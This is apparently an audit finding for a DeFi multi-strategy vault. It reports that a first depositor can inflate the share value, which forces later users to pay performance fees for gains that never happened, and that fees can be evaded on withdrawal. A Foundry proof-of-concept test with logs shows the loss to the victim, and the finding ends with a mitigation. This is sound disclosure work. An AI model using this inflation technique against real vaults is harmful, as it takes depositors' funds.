S-738
shareValue can be inflated and early investors can be charged for performance that never happened
0x007
70
Sufficient
383d ago
Finding description and impact

Performance fees are charged whenever a new highmark is reached. The highmark starts at 1e9 and is updated based on the shareValue, which is calculated using the _convertToAssets function. The calculation of shareValue rounds down and uses the formula below:

function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual override returns (uint256) {
    return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** decimalOffset, rounding);
}

However, the shareValue can be artificially inflated by a malicious first depositor, creating a misleading highmark. Subsequent early legitimate users could then incur performance fees based on this inflated highmark, losing some of their funds unjustly.

Additionally, fees are not automatically taken before deposits or mints, but anyone can manually trigger fee collection by calling takePortfolioAndProtocolFees. This creates the following vulnerabilities:

Performance Fee Exploitation: Malicious actors inflate shareValue and force early users to pay fees for non-existent performance.
Fee Evasion: Large withdrawals can bypass performance and protocol fees if fees are not collected before the withdrawal.
Proof of Concept

This test can be added to ConcreteMultiStrategyVaultTest

import {console} from "forge-std/console.sol";

// ...

function test_shareValue() public {
    asset.mint(jimmy, 1e30);
    asset.mint(hazel, 1e30);

    vm.prank(jimmy);
    asset.approve(address(vault), 1e30);
    vm.prank(hazel);
    asset.approve(address(vault), 1e30);        

    console.log("Initial share value", vault.convertToAssets(1e18));
    
    vm.prank(jimmy);
    vault.mint(1e9);
    vm.prank(jimmy);
    vault.mint(1e9);

    console.log("Final share value", vault.convertToAssets(1e18));

    vm.prank(hazel);
    vault.deposit(1e18);

    console.log("Initial hazel asset", vault.maxWithdraw(hazel));

    vm.prank(jimmy);
    vault.takePortfolioAndProtocolFees();
    
    console.log("Final hazel asset", vault.maxWithdraw(hazel));
}

And the result is

Logs:
  Initial share value 1000000000
  Final share value 1610169492
  Initial hazel asset 950000000000000000
  Final hazel asset 769999999969830509

Recommended mitigation steps

Performance and protocol fees should be taken automatically before any user actions like deposits, mints, or withdrawals. This ensures fees are accurately accounted for in real-time and prevents malicious actors from exploiting the system.
